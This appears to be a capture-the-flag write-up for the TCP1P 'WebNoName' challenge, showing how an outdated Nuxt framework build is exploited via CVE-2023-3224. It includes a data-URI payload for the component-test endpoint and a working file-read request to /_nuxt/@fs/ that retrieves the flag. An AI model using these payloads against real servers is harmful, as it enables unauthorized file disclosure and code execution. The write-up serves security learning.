---
title: WebNoName
date: 2023-12-10T13:37:49+02:00
description: Writeup for Subject Encallmente [TCP1P]
author: 1byteBoy
tags:
  - Web
draft: false
---

**Author**: `daffainfo`

It turns out that learning to make websites using NuxtJS is really fun

[http://ctf.tcp1p.com:45681](http://ctf.tcp1p.com:45681)

----------

The challenge came with a zip file that contains the following files'

```
.
├── docker-compose.yml
└── src
    ├── app.vue
    ├── Dockerfile
    └── flag.txt
```

the most important file to look here is the `Dockerfile` 

```dockerfile
# Use the official Node.js image as the base image
FROM node:18

# Install PNPM
RUN npm uninstall -g yarn pnpm
RUN npm install -g corepack

#RUN mkdir /.cache && chmod -R 777 node_modules/.cache
# Set the working directory in the container
WORKDIR /app

# Clone the Nuxt.js repository and switch to the desired release
RUN git clone https://github.com/nuxt/framework.git /app && \
cd /app && \
git checkout v3.0.0-rc.12

# Copy the test.txt file from the build context into the container
COPY flag.txt /

# Copy app.vue into container
COPY app.vue /app/playground/

# Install project dependencies using pnpm
RUN pnpm install
RUN pnpm build:stub

# Add new user named ctf and add permission for corepace
RUN useradd -ms /bin/bash ctf
RUN mkdir /home/ctf/.cache && chmod -R 777 /home/ctf/.cache && chmod -R 777 /app

# Change to user ctf
USER ctf

# Expose the port that Nuxt.js will run on
EXPOSE 3000

# Start the Nuxt.js development server
CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]
```

there is lot of thing to consider but most importantly 

```
RUN git clone https://github.com/nuxt/framework.git /app && \
cd /app && \
git checkout v3.0.0-rc.12
```

so the developer is cloning the source code of a framework and if we check the link it's a framework called **NuxtJS**. So after cloning the repository it seems, the developer is either going back to some release version and that is the main problem. 

Now if we look for NuxtJS vulnerability with that version number here what we get. First, the core repo is archived and the development has shifted to another repo https://github.com/nuxt/framework

Now if we google for `nuxt framwork security vulnerablity` here is one of the site that we get

https://pentest-tools.com/vulnerabilities-exploits/nuxt-framework-remote-code-execution_CVE-2023-3224 which talks about

*Nuxt Framework is affected by a Remote Code Execution vulnerability inside the `nuxt-root.vue` component. The root cause of this vulnerability is improper sanitization of user-provided input in the URL by accessing `/__nuxt_component_test__/` endpoint. This allows an unauthenticated malicious attacker to execute commands on the Node.js server.*

**Nuxt Framework - Remote Code Execution (CVE-2023-3224)**

the site links to further resources one of which is 
https://nvd.nist.gov/vuln/detail/CVE-2023-3224

This above site further links to a report site which talks a little more detailed about the CVE 
https://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87/

*at this point i was not sure and payloads were not working, i tried the same thing but it was not working, payload like*

```
/__nuxt_component_test__/?path=data%3Atext%2Fjavascript%2Cconsole%2Elog%28%22hello%21%22%29%3B
```

now if we understand what it is doing, it is generally importing the parameter that we pass and executing it in the console, but for us it's different we get one of the errors if we do so 

```
The stylesheet [http://ctf.tcp1p.com:45681/_nuxt/app.vue?vue&type=style&index=0&scoped=938b83b0&lang.css](http://ctf.tcp1p.com:45681/_nuxt/app.vue?vue&type=style&index=0&scoped=938b83b0&lang.css "http://ctf.tcp1p.com:45681/_nuxt/app.vue?vue&type=style&index=0&scoped=938b83b0&lang.css") was not loaded because its MIME type, “application/javascript”, is not “text/css”.
```

cause our app is not any script rather a *text/css* file, so we can't execute any commands but don't worry there are many other ways to exploit it that i got in the following

What i did is google a second time for `__nuxt__ components vulnerability 2023` and got a site https://cve.report/CVE-2023-3224, this site contains most of the blog post or twitter post that talks about the CVE

https://twitter.com/i/web/status/1669259637139427329
https://twitter.com/i/web/status/1669339995780558849

these post contain a similar link to a blog post, which helped me to solve the challenge

The blog explain the CVE in a really detailed way and show different ways of how we can exploit the vulnerability, one of the is 

**Arbitrary File Read in development mode** where we can read any file using the following `/_nuxt/@fs/file/path/here`

now we can intercept the request and paste the following to get the flag

```css
GET /_nuxt/@fs//flag.txt HTTP/1.1
Host: ctf.tcp1p.com:3	000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=21d0ddf1-7c17-48ca-9750-677d04652b56.LkVLdjGo-hu-7LT00_C1YrpJKag
Upgrade-Insecure-Requests: 1
```

```css
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Length: 33
Content-Type: text/plain
Last-Modified: Wed, 11 Oct 2023 15:04:44 GMT
ETag: W/"33-1697036684000"
Cache-Control: no-cache
Date: Sat, 14 Oct 2023 15:18:12 GMT
Connection: close

TCP1P{OuTD4t3d_NuxxT_fR4m3w0RkK}
```


